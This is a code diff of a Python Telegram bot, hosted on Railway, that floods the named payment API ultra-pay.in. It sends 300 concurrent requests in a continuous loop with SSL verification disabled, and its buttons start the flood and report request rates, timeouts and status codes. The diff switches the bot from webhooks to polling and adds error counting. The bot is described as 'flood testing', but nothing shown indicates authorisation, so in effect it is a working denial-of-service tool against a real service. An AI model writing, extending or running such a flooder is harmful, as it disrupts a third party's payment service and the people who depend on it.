@@ -1,8 +1,7 @@
-# bot.py
 #!/usr/bin/env python3
 """
 Telegram Bot for ultra-pay.in API Flood Testing
-Host on Railway
+Host on Railway - Using Polling (No webhooks)
 """
 import asyncio
 import aiohttp
@@ -34,13 +33,14 @@ total_requests = 0
 successful_requests = 0
 failed_requests = 0
 timeout_count = 0
+error_count = 0
 status_counts = {}
 start_time = None
 
 logging.basicConfig(level=logging.INFO)
 
-async def fetch_one(session, url, semaphore, index):
-    global total_requests, successful_requests, failed_requests, timeout_count, status_counts
+async def fetch_one(session, url, semaphore):
+    global total_requests, successful_requests, failed_requests, timeout_count, error_count, status_counts
     
     async with semaphore:
         try:
@@ -67,11 +67,12 @@ async def fetch_one(session, url, semaphore, index):
         except Exception:
             total_requests += 1
             failed_requests += 1
+            error_count += 1
             status_counts['ERROR'] = status_counts.get('ERROR', 0) + 1
             return None
 
 async def flood_loop():
-    global flood_active, total_requests, successful_requests, failed_requests, timeout_count, status_counts, start_time
+    global flood_active
     
     CONCURRENT = 300
     connector = aiohttp.TCPConnector(ssl=False, limit=0)
@@ -83,7 +84,7 @@ async def flood_loop():
             tasks = []
             for _ in range(CONCURRENT):
                 target_url = next(url_cycle)
-                tasks.append(fetch_one(session, target_url, semaphore, 0))
+                tasks.append(fetch_one(session, target_url, semaphore))
             
             await asyncio.gather(*tasks, return_exceptions=True)
             await asyncio.sleep(0.1)
@@ -111,7 +112,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global flood_active, total_requests, successful_requests, failed_requests, timeout_count, status_counts, start_time
+    global flood_active, total_requests, successful_requests, failed_requests, timeout_count, error_count, status_counts, start_time
     
     query = update.callback_query
     await query.answer()
@@ -120,8 +121,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not flood_active:
             flood_active = True
             start_time = datetime.now()
-            context.application.create_task(flood_loop())
-            await query.edit_message_text("🟢 *Flood Started!*\n\nSending requests continuously...", parse_mode='Markdown')
+            # Start flood in background
+            asyncio.create_task(flood_loop())
+            await query.edit_message_text(
+                "🟢 *Flood Started!*\n\n"
+                "Sending 300 concurrent requests continuously...\n"
+                "Use 'Get Stats' to see progress.",
+                parse_mode='Markdown'
+            )
         else:
             await query.edit_message_text("⚠️ *Flood is already running!*", parse_mode='Markdown')
             
@@ -138,9 +145,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"✅ Success: {successful_requests}\n"
                 f"❌ Failed: {failed_requests}\n"
                 f"⏰ Timeouts: {timeout_count}\n"
+                f"🔴 Errors: {error_count}\n"
                 f"📈 Rate: {rate:.1f} req/s\n"
                 f"⏱️ Time: {elapsed:.1f}s\n"
-                f"📊 Status: {status_counts}",
+                f"📊 Status: {dict(list(status_counts.items())[:5])}",
                 parse_mode='Markdown'
             )
         else:
@@ -152,11 +160,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         stats_text = (
             f"📊 *Live Statistics*\n\n"
-            f"🟢 Status: {'Active' if flood_active else 'Stopped'}\n"
+            f"🟢 Status: {'🟢 Active' if flood_active else '🔴 Stopped'}\n"
             f"📌 Total Requests: {total_requests}\n"
             f"✅ Successful: {successful_requests}\n"
             f"❌ Failed: {failed_requests}\n"
             f"⏰ Timeouts: {timeout_count}\n"
+            f"🔴 Errors: {error_count}\n"
             f"📈 Success Rate: {successful_requests/(total_requests or 1)*100:.1f}%\n"
             f"⚡ Speed: {rate:.1f} req/s\n"
             f"📊 Status Codes: {dict(list(status_counts.items())[:5])}"
@@ -169,6 +178,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             successful_requests = 0
             failed_requests = 0
             timeout_count = 0
+            error_count = 0
             status_counts = {}
             start_time = None
             await query.edit_message_text("🔄 *Stats Reset!*", parse_mode='Markdown')
@@ -185,28 +195,26 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Send 300 concurrent requests\n"
         "• Track all responses\n"
         "• Count timeouts\n"
-        "• Real-time statistics",
+        "• Real-time statistics\n"
+        "• Admin control only",
         parse_mode='Markdown'
     )
 
 def main():
+    # Build application
     app = Application.builder().token(BOT_TOKEN).build()
     
+    # Add handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("stats", button_handler))
     app.add_handler(CallbackQueryHandler(button_handler))
     
-    # Get port from Railway
-    port = int(os.environ.get("PORT", 8443))
+    # Start polling (no webhook needed)
+    print("🤖 Bot is starting with polling mode...")
+    print(f"📊 Admin ID: {ADMIN_ID}")
+    print("✅ Bot is ready!")
     
-    print("🤖 Bot is running...")
-    app.run_webhook(
-        listen="0.0.0.0",
-        port=port,
-        url_path=BOT_TOKEN,
-        webhook_url=f"https://{os.environ.get('RAILWAY_STATIC_URL')}/{BOT_TOKEN}" if os.environ.get('RAILWAY_STATIC_URL') else None
-    )
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
     main()
